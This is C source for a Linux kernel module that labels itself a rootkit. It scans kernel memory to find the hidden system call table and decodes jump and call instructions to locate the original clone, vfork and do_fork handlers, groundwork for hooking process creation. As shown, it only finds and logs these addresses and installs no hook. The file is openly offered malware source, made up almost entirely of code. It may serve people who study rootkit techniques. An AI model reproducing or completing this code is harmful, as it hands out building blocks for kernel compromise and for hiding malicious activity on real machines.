#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/errno.h>
#include <linux/list.h>
#include <net/tcp.h>
#include <linux/in.h>
#include <linux/module.h> /* module_init module_exit */
#include <linux/init.h> /* __init __exit */
#include <linux/syscalls.h> /* sys_close __NR_close __NR_mkdir */
#include <linux/delay.h> /* loops_per_jiffy */
#include <asm/bitops.h> /* set_bit clear_bit */
#include <linux/kernel.h>

unsigned long **sys_call_table;
#define DEBUG

#ifdef DEBUG  
# define DLog(fmt, ... ) printk(("Rootkit:%s-[%s]:%d " fmt "\n"), __FILE__, __FUNCTION__, __LINE__, ##__VA_ARGS__);  
#else  
# define DLog(...);  
#endif  

unsigned int offset_clone = 0; 
unsigned char *poffset_clone = NULL; 
unsigned int offset_vfork = 0; 
unsigned char *poffset_vfork  = NULL;
static unsigned int addr_do_fork;
static asmlinkage long(*original_sys_vfork)(struct pt_regs *regs);


static asmlinkage long(*original_sys_clone)(unsigned long clone_flags, unsigned long newsp, void __user *parent_tid, void __user *child_tid, unsigned long	tls);

long prehack_sys_call_table(void);

unsigned int find_do_fork(void) {
	unsigned int ret;
	unsigned char *p;
	unsigned char *psyscall = NULL;
	unsigned char *psysvfork = NULL;

	if (NULL == sys_call_table) {
		DLog("sys_call_table == NULL");
		return 0;
	}

	psyscall = (unsigned char *) sys_call_table[__NR_vfork];

	if (NULL == psyscall) {
		DLog("sys_call_table[__NR_vfork] == NULL");
		return 0;
	}

	for (p = psyscall; p < psyscall + 0x10;) {
		if (*p++ == (unsigned char)(0xE9)) {
			ret = *((unsigned int *) p);
			psysvfork = p + 4 + ret;
			break;
		}
	}

	if ( NULL == psysvfork ) {
		DLog("psysvfork == NULL");
		return 0;
	}

	ret = 0;

	for (p = psysvfork; p < psysvfork + 0x40;) {
		DLog(" 0x%X ",*p);
		if (*p++ == (unsigned char)(0xE8)) {
			ret = *((unsigned int *) p);
			ret = (unsigned int) p + 4 + ret;
			break;
		}
	}

	return ret;
}

unsigned long **find_sys_call_table(void) {
	unsigned long vaddr_number;

	unsigned long **p;

	for (vaddr_number = (unsigned long) sys_close;
	        vaddr_number < (unsigned long) &loops_per_jiffy;
	        vaddr_number += sizeof(void *)) {
		p = (unsigned long **) vaddr_number;
		if (p[__NR_close] == (unsigned long *) sys_close)
			return p;
	}

	return NULL;
}
	
long prehack_sys_call_table(void)
{
	long ret = -1;
	//针对特殊的sys_clone系统调用
	//original_sys_clone = (void *)sys_call_table[__NR_clone];    	//120 - 9
	DLog("original_sys_clone addr[0x%x]", (unsigned int)sys_call_table[__NR_clone]);
	poffset_clone = (void *)sys_call_table[__NR_clone];
	for (; (unsigned int)poffset_clone < (unsigned int)sys_call_table[__NR_clone] + 512; poffset_clone++)
	{
		printk(" 0x%X ",(unsigned char)(*poffset_clone));
		if ((unsigned char)(*poffset_clone) == (unsigned char)(0xE9))
		{
			offset_clone = *((unsigned int *)poffset_clone);
			original_sys_clone = (void *)((unsigned int)poffset_clone + 4 + offset_clone);
			ret += 2;
			break;
		}
		//poffset_clone++;
	}
	printk("\n");
	//针对特殊的sys_vfork系统调用	
	//original_sys_vfork = (void *)sys_call_table[__NR_vfork];      	//190 - 16
	DLog("original_sys_vfork addr[0x%x]", (unsigned int)sys_call_table[__NR_vfork]);
	poffset_vfork = (void *)sys_call_table[__NR_vfork];
	for (; (unsigned int)poffset_vfork < (unsigned int)sys_call_table[__NR_vfork] + 512; poffset_vfork++)
	{
		printk(" 0x%X ", (unsigned char)(*poffset_vfork));
		if ((unsigned char)(*poffset_vfork) == (unsigned char)(0xE9))
		{
			offset_vfork = *((unsigned int *)poffset_vfork);
			original_sys_vfork = (void *)(unsigned int)poffset_vfork + 4 + offset_vfork;
			ret += 3;
			break;
		}
		//poffset_vfork++;
	}
	printk("\n");
	
	DLog("find do fork ret = %d",addr_do_fork = find_do_fork());
	return ret;
}

static int __init ThisInit(void) {
	DLog("rootkit init");

	sys_call_table = find_sys_call_table();
	if (NULL != sys_call_table) {
		DLog("get sys_call_table success![0x%x]", (unsigned int) sys_call_table);
	}
	else {
		DLog("get sys_call_table failure!");
		return -1;
	}

	
	if( 4 != (int)prehack_sys_call_table())
	{
		DLog("backup sys call table failure!![%ld]", prehack_sys_call_table());
		return 0;
	}
	

	return 0;
}

static void __exit ThisExit(void) {

	if(0 == offset_clone || 0 == offset_vfork)
	{	
		DLog("offset_clone or offset_vfork NULL");
		return;
	}
		
	DLog("rootkit exit");
}

module_init(ThisInit);  //模块入口函数
module_exit(ThisExit);  //模块出口函数
MODULE_LICENSE("GPL");
MODULE_AUTHOR("youyifeng");
MODULE_DESCRIPTION("This module can hook the sys_* function.");
